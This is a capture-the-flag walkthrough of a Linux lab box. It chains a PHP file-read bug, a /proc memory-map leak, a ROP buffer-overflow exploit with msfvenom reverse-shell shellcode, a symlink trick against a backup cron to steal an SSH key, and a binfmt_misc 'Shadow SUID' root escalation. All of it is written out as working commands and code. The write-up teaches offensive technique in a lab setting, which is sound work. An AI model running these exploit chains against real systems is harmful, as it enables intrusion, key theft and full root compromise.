2c:T7f66,<p><strong>Difficulty:</strong> Medium | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.227.96</p>
<hr>




<p>Start with how hackers think. Every step follows the same loop:</p>
<pre><code>ENUMERATE → UNDERSTAND → IDENTIFY WEAKNESS → EXPLOIT → PIVOT → REPEAT
</code></pre>
<p>You are not randomly trying things. You are building a mental model of the target system and looking for places where assumptions break down - places where a developer trusted user input, where a script runs with too many privileges, or where memory is not properly bounded.</p>
<p>Every piece of information you gather is ammunition. A username, a file path, a process ID - these all matter.</p>
<hr>
<h2 id="recon-port-scanning">Recon: Port Scanning</h2>
<h3 id="what-we-ran">What we ran</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.96
nmap -p 22,80 -sCV 10.129.227.96
</code></pre>
<h3 id="what-we-found">What we found</h3>
<pre><code>22/tcp open  ssh
80/tcp open  http (nginx)
</code></pre>

<p>The very first question is: <strong>what attack surface exists?</strong> A port is a door. We need to know which doors are open before we can try to walk through one.</p>
<ul>
<li><code>-p-</code> scans ALL 65535 ports (not just the common 1000). Boxes often run services on non-standard ports.</li>
<li><code>--min-rate 10000</code> speeds up the scan on a lab network where we don't care about noise.</li>
<li><code>-sCV</code> on the discovered ports runs version detection (<code>-sV</code>) and default scripts (<code>-sC</code>) to extract banners, software versions, and other metadata.</li>
</ul>

<p>Two ports means a small attack surface. SSH (port 22) is usually not directly exploitable without credentials. HTTP (port 80) is almost always the entry point - web applications are complex, developer-written, and full of bugs. <strong>Start with the web.</strong></p>
<hr>
<h2 id="web-enumeration">Web Enumeration</h2>
<h3 id="what-we-observed">What we observed</h3>
<p>Visiting <code>http://10.129.227.96/</code> redirects to:</p>
<pre><code>/index.php?page=default.html
</code></pre>
<p>This is immediately interesting. The URL is telling us:</p>
<ul>
<li>The backend is <strong>PHP</strong></li>
<li>There is a <strong><code>page</code> parameter</strong> that controls what file is loaded</li>
<li>The value is a filename: <code>default.html</code></li>
</ul>

<p>Any time you see a URL parameter that looks like a filename or path, think: <strong>Local File Inclusion (LFI)</strong>. The server is probably doing something like:</p>
<pre><code class="language-php" data-language="php">readfile($_GET['page']);   // or include(), require(), etc.
</code></pre>
<p>If it's including or reading a file based on user input without proper sanitization, we might be able to make it read files it shouldn't - like <code>/etc/passwd</code> or SSH keys.</p>

<p>A URL parameter named <code>page</code> that takes a filename is a classic sign of <strong>path traversal / LFI</strong>. This is one of the most common web vulnerabilities because developers often need to build templated pages and take shortcuts.</p>
<hr>
<h2 id="file-read-vulnerability">File Read Vulnerability</h2>
<h3 id="testing-the-vulnerability">Testing the vulnerability</h3>
<pre><code class="language-bash" data-language="bash">curl "http://10.129.227.96/index.php?page=/etc/passwd"
</code></pre>
<h3 id="what-we-got">What we got</h3>
<pre><code>root:x:0:0:root:/root:/bin/bash
...
vagrant:x:1000:1000::/vagrant:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
</code></pre>
<p><strong>It worked.</strong> The server read and returned <code>/etc/passwd</code>. This confirms an <strong>arbitrary file read</strong> vulnerability.</p>
<h3 id="understanding-the-vulnerability">Understanding the vulnerability</h3>
<p>Reading <code>index.php</code> itself (by passing <code>page=index.php</code>) reveals the server-side code:</p>
<pre><code class="language-php" data-language="php">&lt;?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) &amp;&amp; preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?&gt;
</code></pre>
<p>This code tries to prevent traversal by:</p>
<ol>
<li>Requiring the path to start with a lowercase letter (<code>^[a-z]</code>)</li>
<li>Stripping <code>../</code> and <code>./</code></li>
</ol>
<p>But when we pass <code>/etc/passwd</code>, the regex check FAILS (starts with <code>/</code>), yet <code>readfile()</code> is still called after the redirect header is set. PHP sends the redirect header but continues executing - this is called <strong>Execute After Redirect (EAR)</strong>.</p>
<p>The server sends a 302 redirect but ALSO sends the file contents in the response body. <code>curl</code> follows redirects by default, but by reading the raw response, we get the file.</p>
<h3 id="what-we-learned-from-etc-passwd">What we learned from /etc/passwd</h3>
<ul>
<li>Username: <strong>dev</strong> with home <code>/home/dev</code></li>
<li>This will be our target user</li>
</ul>

<p>Do not trust a redirect. Many web frameworks and custom PHP code redirect on error but forget to call <code>exit()</code> or <code>die()</code> after setting the redirect header. The response body still contains the result of the remaining code. intercept traffic in Burp or check raw responses with <code>curl</code> without <code>-L</code> to see what's really being returned.</p>

<h3 id="why-proc-matters">Why /proc matters</h3>
<p>On Linux, the <code>/proc</code> filesystem is a virtual filesystem that exposes the kernel's internal state. For every running process, there is a folder <code>/proc/[PID]/</code> containing:</p>
<ul>
<li><code>cmdline</code> : what command was used to start it</li>
<li><code>maps</code> : what memory regions the process has mapped</li>
<li><code>fd/</code> : open file descriptors</li>
<li><code>exe</code> : symlink to the executable</li>
</ul>
<p>This is a useful source when you have arbitrary file read, because <code>/proc</code> exposes live runtime information about every process on the system.</p>
<h3 id="downloading-the-binary">Downloading the binary</h3>
<pre><code class="language-bash" data-language="bash">curl "http://10.129.227.96/index.php?page=/usr/bin/activate_license" -o activate_license
</code></pre>
<p>We can download the binary itself because our file read has no content-type restriction. The binary is just bytes on disk - we can exfiltrate it.</p>

<p>When you have file read, think beyond just <code>/etc/passwd</code> and SSH keys. The entire filesystem is readable. Running processes expose their binaries, config files, memory maps, and environment variables through <code>/proc</code>. If there's a custom service running, <strong>download its binary</strong> - you can reverse engineer it locally.</p>

<h3 id="why-these-addresses-matter">Why these addresses matter</h3>
<p>Modern Linux has <strong>ASLR (Address Space Layout Randomization)</strong> - every time a program starts, its libraries are loaded at random addresses. This is a security mitigation designed to make exploits harder: you can't hardcode an address like <code>system()</code> because it changes on every run.</p>
<p>BUT - on this machine, <code>activate_license</code> is a forking server. The main process starts once and forks (copies itself) to handle each connection. When you <code>fork()</code>, the child gets an <strong>exact copy of the parent's memory layout</strong>. The addresses in the fork are identical to the parent.</p>
<p>This means: <strong>if we can read the maps of the parent process, the child process that handles our exploit connection will have those same addresses.</strong> ASLR is defeated.</p>

<p>ASLR is not unbreakable. Any information leak that tells you where a library is loaded in memory defeats ASLR. Here, the combination of file read + <code>/proc/[pid]/maps</code> gives us a precise memory map of the live process. This is exactly what we need to build a working exploit.</p>

<h3 id="why-we-need-these">Why we need these</h3>
<p>To build a ROP chain (explained next), we need gadgets - small sequences of instructions that end with <code>ret</code>. These gadgets exist inside the libraries the program uses. We need the <strong>exact library files from the target machine</strong> (not our local copies) because the offsets of gadgets differ between versions and builds.</p>

<h2 id="building-the-buffer-overflow-exploit">Building the Buffer Overflow Exploit</h2>
<h3 id="the-vulnerability">The vulnerability</h3>
<p>From reversing <code>activate_license</code> (either with Ghidra or reading the writeup):</p>
<pre><code class="language-c" data-language="c">char buffer[512];
uint32_t msglen;

read(sockfd, &amp;msglen, 4);         // read 4 bytes for length
msglen = ntohl(msglen);
read(sockfd, buffer, msglen);     // read MSGLEN bytes into 512-byte buffer!
</code></pre>
<p>The server reads a 4-byte length, converts it to a number, then reads that many bytes into a fixed 512-byte buffer. If we say the message is 1024 bytes long, we write 1024 bytes into a 512-byte buffer - <strong>classic stack buffer overflow</strong>.</p>
<h3 id="why-there-s-no-easy-path">Why there's no easy path</h3>
<p>Running <code>checksec</code> on the binary reveals:</p>
<pre><code>RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre>
<ul>
<li><strong>No stack canary</strong> : good for us, the overflow won't be detected</li>
<li><strong>NX enabled</strong> : bad for us, we cannot execute shellcode directly on the stack</li>
<li><strong>PIE enabled</strong> : binary loads at random addresses (but we defeated this with the maps leak)</li>
<li><strong>Full RELRO</strong> : GOT is read-only, no GOT overwrite attacks</li>
</ul>
<p>Because NX is enabled, we need <strong>Return Oriented Programming (ROP)</strong>.</p>
<h3 id="what-is-rop">What is ROP?</h3>
<p>ROP (Return Oriented Programming) is a technique to execute arbitrary code without injecting new code. Instead, we:</p>
<ol>
<li>Overflow the buffer to control the <strong>return address</strong> (what address the function returns to)</li>
<li>Chain together small snippets of existing code called <strong>gadgets</strong> that end in <code>ret</code></li>
<li>Each gadget does something small (like <code>pop rdi; ret</code> to load a value into a register)</li>
<li>String them together to call any function with any arguments</li>
</ol>
<p>Think of it like a vending machine where you can only press existing buttons but by pressing the right sequence, you can get any item you want.</p>
<h3 id="our-rop-strategy-mprotect-jmp-rsp-shellcode">Our ROP strategy: mprotect → JMP RSP → shellcode</h3>
<ol>
<li>Call <code>mprotect(stack_start, stack_size, 7)</code> to make the stack <strong>readable + writable + executable</strong></li>
<li>Then JMP to the top of the stack where we've placed shellcode</li>
<li>The shellcode spawns a reverse shell</li>
</ol>
<p>To call <code>mprotect(addr, len, prot)</code> we need:</p>
<ul>
<li><code>RDI = stack_start</code> (first argument)</li>
<li><code>RSI = stack_size</code> (second argument)</li>
<li><code>RDX = 7</code> (third argument - rwx permissions)</li>
<li>Then call <code>mprotect</code></li>
</ul>
<p>We use pwntools to find ROP gadgets automatically from the libraries we downloaded.</p>
<h3 id="generating-shellcode">Generating shellcode</h3>
<pre><code class="language-bash" data-language="bash">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.84 LPORT=4444 -f py
</code></pre>
<p>This generates x64 shellcode that connects back to our machine and gives us a shell.</p>
<h3 id="the-exploit-script-exploit-py">The exploit script (exploit.py)</h3>
<pre><code class="language-python" data-language="python">from pwn import *
import requests

context.arch = 'amd64'

libc_base      = 0x7fba87829000
libsqlite_base = 0x7fba879ee000
stack_start    = 0x7ffd2a7ae000
stack_end      = 0x7ffd2a7cf000
stack_length   = stack_end - stack_start

libc   = ELF('./libc-2.31.so', checksec=False)
libsql = ELF('./libsqlite3.so.0.8.6', checksec=False)
libc.address   = libc_base
libsql.address = libsqlite_base

rop      = ROP([libc, libsql])
mprotect = libc.symbols['mprotect']
pop_rdi  = rop.rdi[0]
pop_rsi  = rop.rsi[0]
pop_rdx  = rop.rdx[0]
jmp_rsp  = rop.jmp_rsp[0]

# shellcode (msfvenom output)
buf = b"\x6a\x29\x58..." # truncated

offset  = 520  # bytes to reach return address
payload  = b'A' * offset
payload += p64(pop_rdi)  + p64(stack_start)   # arg1 = stack start
payload += p64(pop_rsi)  + p64(stack_length)  # arg2 = stack size
payload += p64(pop_rdx)  + p64(7)             # arg3 = rwx
payload += p64(mprotect)                       # call mprotect
payload += p64(jmp_rsp)                        # jump to stack
payload += buf                                 # reverse shell shellcode

requests.post('http://10.129.227.96/activate_license.php',
              files={'licensefile': payload})
</code></pre>
<h3 id="why-offset-520">Why offset = 520?</h3>
<p>The buffer is 512 bytes, plus 8 bytes of saved RBP = 520 bytes before we reach the return address. We confirmed this with GDB pattern analysis.</p>

<p>ROP is the modern standard for exploiting binaries with NX. Instead of writing new code, you <strong>reuse the target's own code</strong>. Every library contains thousands of gadgets. The key insight is: you don't need to write new instructions - you just need to chain existing ones in the right order. The <code>jmp rsp</code> gadget is the bridge between the ROP chain (which makes the stack executable) and the shellcode (which gives us the shell).</p>

<h2 id="privilege-escalation-www-data-to-dev">Privilege Escalation: www-data to dev</h2>
<h3 id="discovering-the-backup-cron">Discovering the backup cron</h3>
<pre><code class="language-bash" data-language="bash">ls -la /var/www/
# Shows: 2026-06-09_10-26-00-html.zip, 2026-06-09_10-27-00-html.zip ...
</code></pre>
<p>New zip files appear every minute, owned by <strong>dev</strong>. A cron job running as dev is creating these backups.</p>
<pre><code class="language-bash" data-language="bash">grep -r / -e '-html.zip' 2&gt;/dev/null
# /usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
</code></pre>
<p>The script at <code>/usr/bin/webbackup</code>:</p>
<pre><code class="language-bash" data-language="bash">#!/bin/bash
cd /var/www/
SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
/usr/bin/zip --recurse-paths "$DST" "$SRC"
</code></pre>
<p>It zips the entire <code>/var/www/html</code> directory. By default, <code>zip --recurse-paths</code> <strong>follows symlinks</strong> - it includes the contents of whatever the symlink points to, not the symlink itself.</p>
<h3 id="the-symlink-attack">The symlink attack</h3>
<pre><code class="language-bash" data-language="bash">ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
</code></pre>
<p>We create a symlink inside the directory being backed up. The symlink points to dev's private SSH key. When the cron runs next, zip follows the symlink and includes the actual key file content in the zip.</p>
<h3 id="extracting-the-key">Extracting the key</h3>
<pre><code class="language-bash" data-language="bash"># Wait for new zip (up to 60 seconds), then:
cd /dev/shm
cp $(ls /var/www/*.zip | tail -1) .
unzip -p *.zip 'var/www/html/id_rsa'
</code></pre>
<p>The key is printed to stdout. We copy it to our Kali machine.</p>

<p>The backup script runs as <code>dev</code>. Dev has read access to their own <code>.ssh/id_rsa</code>. By planting a symlink in a directory the script processes, we trick the script (running with dev's permissions) into including a file we can't directly read as www-data.</p>
<p>This is called a <strong>symlink attack</strong> or <strong>symlink following vulnerability</strong>. The script doesn't validate whether the files being zipped are symlinks - it just follows them.</p>

<p>When you see a scheduled task (cron job) running as a privileged user that processes files in a directory you can write to, think symlinks. The cron has higher privileges than you - make it do your dirty work. This pattern appears constantly in CTFs and real-world privilege escalation: find a privileged process that touches files you control.</p>

<h2 id="privilege-escalation-dev-to-root">Privilege Escalation: dev to root</h2>
<h3 id="enumeration-as-dev">Enumeration as dev</h3>
<pre><code class="language-bash" data-language="bash">ls ~/
# activate_license  emuemu  user.txt
ls ~/emuemu/
# emuemu  emuemu.c  Makefile  README.md  reg_helper  reg_helper.c  test/
</code></pre>
<p>The <code>emuemu</code> directory contains a software emulator project with something interesting: <code>reg_helper</code>.</p>
<h3 id="understanding-reg-helper">Understanding reg_helper</h3>
<pre><code class="language-c" data-language="c">// reg_helper.c
int main(void) {
    char cmd[512] = { 0 };
    read(STDIN_FILENO, cmd, sizeof(cmd));
    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    write(fd, cmd, strnlen(cmd, sizeof(cmd)));
    close(fd);
    return 0;
}
</code></pre>
<p>This program reads from stdin and writes to <code>/proc/sys/fs/binfmt_misc/register</code>.</p>
<p>Checking capabilities:</p>
<pre><code class="language-bash" data-language="bash">/usr/sbin/getcap /usr/lib/emuemu/reg_helper
# /usr/lib/emuemu/reg_helper cap_dac_override=ep
</code></pre>
<p><code>cap_dac_override</code> means: <strong>bypass file read, write, and execute permission checks</strong>. Normally only root can write to <code>/proc/sys/fs/binfmt_misc/register</code> (it's mode 0200, writable only by root). But reg_helper can write to it as any user because of this capability.</p>
<h3 id="what-is-binfmt-misc">What is binfmt_misc?</h3>
<p>Binfmt_misc (Binary Format Miscellaneous) is a Linux kernel feature that lets you register custom "interpreters" for file types. For example, you could register <code>.jar</code> files to be run with <code>java -jar</code>, or <code>.py</code> files with <code>python3</code>.</p>
<p>The registration format is:</p>
<pre><code>:name:type:offset:magic:mask:interpreter:flags
</code></pre>
<p>The <strong><code>C</code> flag</strong> is crucial: it makes the interpreter run with the <strong>credentials of the file being executed</strong> - not the user who ran it. So if a SetUID (SUID) root binary is executed and matches a binfmt_misc rule with the C flag, the interpreter runs <strong>as root</strong>.</p>
<h3 id="the-exploit-plan">The exploit plan</h3>
<ol>
<li><strong>Compile a rootshell</strong> : a binary that calls <code>setresuid(0,0,0)</code> and then launches bash</li>
<li><strong>Create a symlink</strong> with a custom extension pointing to a SUID binary (newgrp)</li>
<li><strong>Register an extension rule</strong> via reg_helper that maps our extension to rootshell with the C flag</li>
<li><strong>Run the symlink</strong> : binfmt_misc matches the extension, runs rootshell with root credentials</li>
</ol>
<h3 id="step-by-step">Step by step</h3>
<p><strong>Step 1: Compile rootshell</strong></p>
<pre><code class="language-bash" data-language="bash">cat &gt; /dev/shm/rootshell.c &lt;&lt; 'EOF'
#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
int main(void) {
    char *const p[] = {"/bin/bash", "-p", NULL};
    setresuid(0,0,0);   // set all UIDs to root
    setresgid(0,0,0);   // set all GIDs to root
    execve(p[0], p, NULL);
    return 0;
}
EOF
gcc -o /dev/shm/rootshell /dev/shm/rootshell.c
chmod +x /dev/shm/rootshell
</code></pre>
<p><strong>Step 2: Symlink to SUID binary</strong></p>
<pre><code class="language-bash" data-language="bash">ln -s /usr/bin/newgrp /dev/shm/newgrp.sploit
</code></pre>
<p><code>newgrp</code> is a SUID root binary (it changes group memberships and needs root to do so). By creating a symlink with the <code>.sploit</code> extension, when we run the symlink, the kernel sees a file named <code>newgrp.sploit</code> - our custom extension.</p>
<p><strong>Step 3: Register the binfmt_misc rule</strong></p>
<pre><code class="language-bash" data-language="bash">echo ':sploit:E::sploit::/dev/shm/rootshell:C' | /usr/lib/emuemu/reg_helper
</code></pre>
<p>Breaking down <code>:sploit:E::sploit::/dev/shm/rootshell:C</code>:</p>
<ul>
<li><code>:sploit</code> : rule name: "sploit"</li>
<li><code>:E</code> : match by <strong>Extension</strong> (not magic bytes)</li>
<li><code>::</code> : no offset (not applicable for extension matching)</li>
<li><code>:sploit</code> : match files with <code>.sploit</code> extension</li>
<li><code>:</code> : no mask</li>
<li><code>:/dev/shm/rootshell</code> : interpreter to run</li>
<li><code>:C</code> : use <strong>Credentials</strong> of the matched file (newgrp is SUID root → run as root)</li>
</ul>
<p><strong>Step 4: Trigger the exploit</strong></p>
<pre><code class="language-bash" data-language="bash">/dev/shm/newgrp.sploit
</code></pre>
<h3 id="what-happens-when-we-run-it">What happens when we run it</h3>
<ol>
<li>We execute <code>/dev/shm/newgrp.sploit</code></li>
<li>The kernel sees a file with <code>.sploit</code> extension</li>
<li>Binfmt_misc finds our rule matching <code>.sploit</code></li>
<li>The kernel sees <code>newgrp.sploit</code> is a symlink to <code>newgrp</code>, which has the <strong>SUID root bit</strong> set</li>
<li>With the <code>C</code> flag, the kernel runs <code>/dev/shm/rootshell</code> with <strong>root credentials</strong></li>
<li>Rootshell calls <code>setresuid(0,0,0)</code> : succeeds (we're already root)</li>
<li>Rootshell calls <code>execve("/bin/bash", ["/bin/bash", "-p", NULL], NULL)</code></li>
<li>Bash starts with root privileges</li>
</ol>

<p>This is a "Shadow SUID" attack. Instead of needing a SUID binary that does what you want, you <strong>hijack</strong> the execution of ANY existing SUID binary and redirect it to your own code - while keeping the SUID credentials.</p>
<p>The <code>C</code> flag in binfmt_misc exists for legitimate reasons (to support things like <code>.NET</code> executables that should run with the binary's permissions). But when combined with <code>cap_dac_override</code> on a binary that writes to the register file, it becomes a privilege escalation primitive.</p>
<p>The key insight: <strong>reg_helper can write to a root-only file because of its capability. That write lets us register a rule that steals root credentials from SUID binaries.</strong></p>

<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="1-file-read-just-etc-passwd">1. File Read ≠ Just /etc/passwd</h3>
<p>An arbitrary file read is an high-impact primitive. On this box it gave us:</p>
<ul>
<li>Source code of the application</li>
<li>Live memory maps of running processes</li>
<li>The binary of the service itself</li>
<li>Foundation for the entire exploit chain</li>
</ul>
<p>Think: <strong>what files on this system are valuable?</strong></p>
<h3 id="2-proc-is-a-privilege-map">2. /proc is a privilege map</h3>
<p><code>/proc/[pid]/maps</code>, <code>/proc/[pid]/cmdline</code>, <code>/proc/sched_debug</code>, <code>/proc/sys/...</code> - the proc filesystem exposes the live kernel state. When you can read arbitrary files, <code>/proc</code> should be one of the first things you explore.</p>
<h3 id="3-aslr-isn-t-magic">3. ASLR isn't magic</h3>
<p>ASLR prevents hardcoded addresses. It does NOT prevent information leaks. If you can read the maps file of a process, ASLR is defeated for that process. look for memory leaks alongside buffer overflows.</p>
<h3 id="4-forking-servers-are-special">4. Forking servers are special</h3>
<p>A service that handles requests by <code>fork()</code>ing a copy of itself means the child inherits the parent's exact memory layout. Read the parent's maps once, use those addresses forever (until the server restarts).</p>
<h3 id="5-cron-jobs-running-as-privileged-users-are-dangerous">5. Cron jobs running as privileged users are dangerous</h3>
<p>If a cron runs as a privileged user and touches a directory you control, you can often influence what it processes via symlinks, hardlinks, or race conditions. Check what's in <code>/etc/cron*</code>, <code>/var/spool/cron</code>, and use <code>pspy</code> to monitor crons.</p>
<h3 id="6-linux-capabilities-are-often-overlooked">6. Linux capabilities are often overlooked</h3>
<p><code>setcap</code> gives fine-grained privileges to binaries without making them fully SUID root. But capabilities can be just as dangerous. <code>cap_dac_override</code> (bypasses file permissions) is nearly as powerful as root for file operations. run <code>getcap -r / 2&gt;/dev/null</code> as part of privilege escalation enumeration.</p>
<h3 id="7-binfmt-misc-c-flag-suid-root">7. binfmt_misc C flag + SUID = root</h3>
<p>The Shadow SUID technique: register a binfmt_misc rule with the C flag that matches any SUID binary. The interpreter inherits the SUID credentials. This works whenever you can write to <code>/proc/sys/fs/binfmt_misc/register</code> - normally only root can, but capabilities can grant this.</p>
<h3 id="8-don-t-use-generic-elf-magic-bytes-for-binfmt-misc">8. Don't use generic ELF magic bytes for binfmt_misc</h3>
<p><strong>Lesson learned the hard way on this box:</strong> If you register a binfmt_misc rule that matches generic ELF magic bytes (the first 24 bytes of any ELF binary), it will match <strong>everything</strong> - including the interpreter you registered. This causes infinite recursion in the kernel and breaks execution of ALL ELF binaries on the system. use the <strong>extension method</strong> (<code>:E:</code>) or very specific magic bytes unique to your target binary.</p>
<h3 id="9-when-things-break-pivot-with-what-still-works">9. When things break, pivot with what still works</h3>
<p>When the faulty binfmt_misc rule broke ELF execution, <code>gcc</code> and <code>python3</code> still worked because they are compiled as <code>ET_EXEC</code> (non-PIE) and did not match the PIE-only (<code>ET_DYN</code>) rule. Python 3 could still write files and gcc could still compile, providing a recovery path.</p>
